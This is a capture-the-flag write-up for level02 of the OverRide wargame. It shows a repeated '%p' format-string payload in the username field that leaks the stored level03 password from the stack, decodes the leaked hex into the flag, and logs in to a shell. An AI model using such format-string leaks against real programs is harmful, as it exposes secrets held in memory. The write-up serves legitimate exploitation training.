After analyzing the source code, we can see that it executes /bin/sh only if the password matches the flag.

We also noticed an unprotected printf function used to display the username, which we can exploit to display the content of the line file = fopen("/home/users/level03/.pass", "r");.

First, let's test this:

``` Shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

We can see five pointers:

0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d


Converting these to ASCII gives us: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M.

``` Shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
--[ Password: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
*****************************************
unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M does not have access!
```

Next, we reverse the pointer order before converting to ASCII:

0x48336750664b394d 0x354a35686e475873 0x377a7143574e6758 0x45414a3561733951 0x756e505234376848

H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH

This gives us: `H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH`.

Reversing this string, we get: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.

Let's test this:

``` Shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H!
$ 
```
